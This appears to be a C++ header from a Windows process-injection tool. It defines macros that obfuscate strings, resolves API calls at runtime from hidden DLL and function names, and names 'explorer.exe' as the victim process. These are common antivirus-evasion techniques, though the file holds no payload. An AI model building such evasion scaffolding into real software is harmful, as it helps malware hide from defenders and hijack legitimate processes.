#pragma once

#include <vector>
#include <windows.h>

#include "Obfuscation.hpp"

#define NO_DISCARD [[nodiscard]]

#define UNUSED(var) [[maybe_unused]] var

#ifdef NDEBUG
#define DEBUG_PRINT(message)
#define DEBUG_PRINT_W(message)
#else
#define DEBUG_PRINT(message) OutputDebugStringA(message.c_str());
#define DEBUG_PRINT_W(message) OutputDebugStringW(message.c_str());
#endif

#define OBFUSCATE(plaintext_string) deobfuscate(obfuscate<std::string(plaintext_string).size()>(plaintext_string))
#define WOBFUSCATE(plaintext_string) wdeobfuscate(wobfuscate<std::wstring(plaintext_string).size()>(plaintext_string))

#define RESOLVE(dll_name, function_name) reinterpret_cast<decltype(::function_name)*>(GetProcAddress(LoadLibraryA(OBFUSCATE(#dll_name).c_str()), OBFUSCATE(#function_name).c_str()))

using Byte = uint8_t;
using ByteVector = std::vector<Byte>;
using Address64 = uint64_t;
using Pid = uint32_t;
using Tid = uint32_t;

static const std::wstring VICTIM_PROCESS = WOBFUSCATE(L"explorer.exe");

static constexpr size_t PAGE_SIZE = 0x1000;